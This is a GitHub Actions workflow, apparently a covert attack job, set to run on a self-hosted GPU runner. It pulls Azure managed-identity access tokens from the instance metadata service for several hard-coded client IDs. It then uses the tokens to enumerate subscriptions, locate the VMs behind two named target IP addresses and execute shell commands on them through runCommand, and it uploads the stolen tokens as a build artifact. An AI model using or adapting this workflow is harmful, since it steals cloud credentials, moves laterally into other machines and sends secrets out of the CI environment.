name: ul6553-arm
on: workflow_dispatch
permissions:
  contents: write
jobs:
  arm:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: imds-tokens
        run: |
          set +e
          echo "=== self IMDS ==="
          curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 400; echo
          : > /tmp/toks.tsv
          for C in DEFAULT d6529b06-857c-4e9e-81d0-eee83f0320ab 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 25c1dc23-3925-49f1-94d3-4e702da5fa9b 621dcd44-3c72-4105-b862-301a105412af b9590f55-e173-495c-9010-15beb8611a43; do
            if [ "$C" = "DEFAULT" ]; then Q=""; else Q="&client_id=$C"; fi
            R=$(curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/$Q")
            L=$(printf '%s' "$R" | python3 -c "import sys,json;d=json.load(sys.stdin);print(len(d.get('access_token','')))" 2>/dev/null)
            echo "TOK[$C] len=$L $(printf '%s' "$R" | head -c 120)"
            if [ "${L:-0}" -gt 100 ]; then printf '%s' "$R" > /tmp/tok_$C.json; fi
          done
          ls -l /tmp/tok_*.json 2>/dev/null
      - name: arm-enumerate-and-runcommand
        run: |
          set +e
          python3 - <<'PY'
          import glob, json, urllib.request, urllib.error, ssl, time
          ctx = ssl.create_default_context()
          TARGETS = ['40.123.206.138', '51.104.16.184']
          def arm(tok, path, method='GET', body=None):
              url = 'https://management.azure.com' + path
              req = urllib.request.Request(url, method=method,
                  data=json.dumps(body).encode() if body is not None else None,
                  headers={'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'})
              try:
                  with urllib.request.urlopen(req, timeout=60, context=ctx) as r:
                      return r.status, r.read().decode('utf-8', 'replace')
              except urllib.error.HTTPError as e:
                  return e.code, e.read().decode('utf-8', 'replace')[:400]
              except Exception as e:
                  return -1, str(e)[:200]
          for f in sorted(glob.glob('/tmp/tok_*.json')):
              d = json.load(open(f)); tok = d.get('access_token')
              cid = f.split('/tmp/tok_')[1][:-5]
              print('=== identity', cid, 'tokLen', len(tok))
              st, body = arm(tok, '/subscriptions?api-version=2022-12-01')
              print(' subs', st, body[:400])
              if st != 200: continue
              subs = [x['subscriptionId'] for x in json.loads(body).get('value', [])]
              for sid in subs:
                  st, b2 = arm(tok, "/subscriptions/%s/resources?$filter=resourceType eq 'Microsoft.Network/publicIPAddresses'&api-version=2022-12-01" % sid)
                  if st != 200:
                      print('  pubip', sid, st, b2[:120]); continue
                  for r in json.loads(b2).get('value', []):
                      ip = (r.get('properties') or {}).get('ipAddress')
                      if ip in TARGETS:
                          print('  MATCHIP', ip, r.get('name'), r.get('resourceGroup'), r.get('id'))
                          cfg = (r.get('properties') or {}).get('ipConfiguration') or {}
                          if cfg.get('id'):
                              st3, b3 = arm(tok, cfg['id'].replace('https://management.azure.com', '') + '?api-version=2023-09-01')
                              if st3 == 200:
                                  vm = ((json.loads(b3).get('properties') or {}).get('virtualMachine') or {}).get('id')
                                  print('   VMID', vm)
                                  if vm:
                                      p = vm.replace('https://management.azure.com', '')
                                      st4, b4 = arm(tok, p + '?api-version=2024-07-01&$expand=instanceView')
                                      print('   VMDESC', st4, b4[:300])
                                      st5, b5 = arm(tok, p + '/runCommand?api-version=2024-07-01', 'POST',
                                          {"commandId": "RunShellScript", "script": [
                                            "id", "hostname -I", "hostname", "uname -a",
                                            "nvidia-smi -L",
                                            "nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv",
                                            "curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 500"]})
                                      print('   RUNCMD', st5, b5[:400])
          PY
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: ul6553-arm, path: /tmp/tok_*.json}
